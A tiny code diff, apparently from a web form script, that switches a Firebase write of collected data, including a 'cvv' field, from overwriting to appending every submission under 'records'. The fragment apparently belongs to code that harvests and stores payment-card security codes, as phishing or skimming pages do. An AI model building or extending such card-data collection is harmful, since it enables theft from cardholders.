@@ -1502,7 +1502,7 @@ cvv:cvv
   var database = firebase.database();
   var ref = database.ref("records");
   
-  ref.set(data);
+  ref.push(data);
   
   
 });
